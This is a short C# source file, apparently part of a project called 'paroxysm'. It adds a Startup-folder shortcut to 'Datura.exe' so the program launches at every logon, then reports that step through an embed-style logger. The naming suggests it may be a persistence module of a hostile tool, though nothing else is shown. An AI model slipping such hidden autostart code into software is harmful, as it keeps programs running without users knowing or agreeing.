using IWshRuntimeLibrary;
using paroxysm.Debug;

namespace paroxysm.Hooks.Actions;

public static class AutoRunAction
{
    public static void Follow()
    {
        var startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        var appPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Datura.exe");
        var shortcutName = "Datura.lnk";

        var shortcutPath = Path.Combine(startupFolderPath, shortcutName);

        try
        {
            if (!Directory.Exists(startupFolderPath))
            {
                Directory.CreateDirectory(startupFolderPath);
            }

            WshShell shell = new();
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutPath);
            shortcut.TargetPath = appPath;
            shortcut.Save();

            Logger.CreateEmbed(ELoggerState.Error, new Exception(startupFolderPath));

            Logger.CreateEmbed(ELoggerState.Error, new Exception("Aplikacja została dodana do autostartu."));
        }
        catch (Exception ex)
        {
            Logger.CreateEmbed(ELoggerState.Error, ex);
        }
    }
}